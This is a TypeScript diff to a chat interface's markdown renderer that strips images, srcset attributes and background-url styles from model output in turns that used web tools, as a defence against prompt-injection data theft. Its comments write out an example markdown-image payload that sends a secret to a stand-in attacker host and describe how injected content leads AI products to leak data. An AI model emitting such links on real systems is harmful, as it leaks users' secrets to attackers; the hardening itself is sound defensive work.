@@ -74,6 +74,10 @@ export function _postProcessMathFallbacksForTest(container: HTMLElement): void {
   _postProcessMathFallbacks(container);
 }
 
+export function _stripExfilImageVectorsForTest(container: HTMLElement): void {
+  _stripExfilImageVectors(container);
+}
+
 // ── Markdown ──
 
 /**
@@ -87,6 +91,15 @@ function _renderMarkdown(part: IChatMarkdownContent): HTMLElement {
   el.innerHTML = _markdownToHtml(part.content);
   _postProcessMathFallbacks(el);
 
+  // M65 Iter 2 (Layer 6) — strip every plausible image-loading vector when
+  // the producing turn touched a red web tool. Markdown-image exfil
+  // (`![](https://attacker/?d=SECRET)`) is the most common LLM-output exfil
+  // channel documented in Brave's "Unseeable prompt injections" research.
+  // Strict equality with `true` — undefined/false renders normally.
+  if (part.usedWebTools === true) {
+    _stripExfilImageVectors(el);
+  }
+
   // M15: Post-process [N] citation markers into clickable superscript badges.
   // The model emits [1], [2] etc. based on numbered retrieved context.
   // We replace those text nodes with interactive badges that navigate to the source.
@@ -98,6 +111,56 @@ function _renderMarkdown(part: IChatMarkdownContent): HTMLElement {
   }
 
   return el;
+}
+
+/**
+ * M65 Iter 2 (Layer 6) — renderer image-exfil hardening.
+ *
+ * Strips every image-loading vector from a markdown-rendered element when
+ * the producing turn used a red web tool. The attack closed here is
+ * markdown-image exfil: model output `![alt](https://attacker/?d=SECRET)`
+ * becomes an auto-loaded `<img>` whose query string leaks secrets to a
+ * server the attacker controls. Documented in Brave's "Unseeable prompt
+ * injections" research (2025); demonstrated against AgentForce, Superhuman,
+ * Notion 3.0, Slack AI.
+ *
+ * Suppressed vectors:
+ *   - `<img>` tag (replaced with its `alt` text in brackets, or `[image]`)
+ *   - `<picture>` and child `<source>` tags
+ *   - `srcset` attribute on any tag
+ *   - inline `style` attribute containing `background-image:` or
+ *     `background:` with `url(...)`.
+ *
+ * Legitimate images in untainted turns (`usedWebTools !== true`) render
+ * unchanged.
+ */
+function _stripExfilImageVectors(container: HTMLElement): void {
+  // <img>
+  for (const img of Array.from(container.querySelectorAll('img'))) {
+    const alt = img.getAttribute('alt') || '';
+    const replacement = container.ownerDocument!.createTextNode(
+      alt ? `[image: ${alt}]` : '[image]',
+    );
+    img.replaceWith(replacement);
+  }
+  // <picture> / <source>
+  for (const pic of Array.from(container.querySelectorAll('picture'))) {
+    pic.remove();
+  }
+  for (const src of Array.from(container.querySelectorAll('source'))) {
+    src.remove();
+  }
+  // srcset on any remaining element
+  for (const el of Array.from(container.querySelectorAll('[srcset]'))) {
+    el.removeAttribute('srcset');
+  }
+  // inline style with background-image / background: url(...)
+  for (const el of Array.from(container.querySelectorAll<HTMLElement>('[style]'))) {
+    const style = el.getAttribute('style') || '';
+    if (/background(-image)?\s*:[^;]*url\s*\(/i.test(style)) {
+      el.removeAttribute('style');
+    }
+  }
 }
 
 function _postProcessMathFallbacks(container: HTMLElement): void {
